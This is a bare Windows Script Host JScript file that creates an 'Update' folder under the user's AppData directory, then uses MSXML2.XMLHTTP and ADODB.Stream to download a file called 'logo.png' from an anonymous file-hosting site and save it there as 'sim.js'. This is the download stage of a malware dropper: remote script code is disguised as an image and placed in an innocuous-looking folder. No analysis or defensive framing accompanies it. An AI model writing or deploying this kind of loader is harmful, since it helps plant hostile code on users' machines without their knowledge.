var download = function(sSourceUrl, sDestFile) {
    var objXMLHTTP = new ActiveXObject("MSXML2.XMLHTTP");
    objXMLHTTP.onreadystatechange = function() {
        if (objXMLHTTP.readyState === 4) {
            var objADOStream = new ActiveXObject("ADODB.Stream");
            objADOStream.open();
            objADOStream.type = 1; // Binary
            objADOStream.write(objXMLHTTP.ResponseBody);
            objADOStream.position = 0;
            objADOStream.saveToFile(sDestFile, 2);
            objADOStream.close();
        }
    };

    objXMLHTTP.open("GET", sSourceUrl, false);
    objXMLHTTP.send();
}

var WshShell = new ActiveXObject("WScript.Shell");
var appdata = WshShell.ExpandEnvironmentStrings("%APPDATA%");
var uf = appdata + "\\Update";

var fs = fs = new ActiveXObject("Scripting.FileSystemObject");
if (!fs.FolderExists(uf))
    fs.CreateFolder(uf);

//WScript.Echo(appdata);
download("https://anonfiles.com/static/logo.png", uf + "\\sim.js");
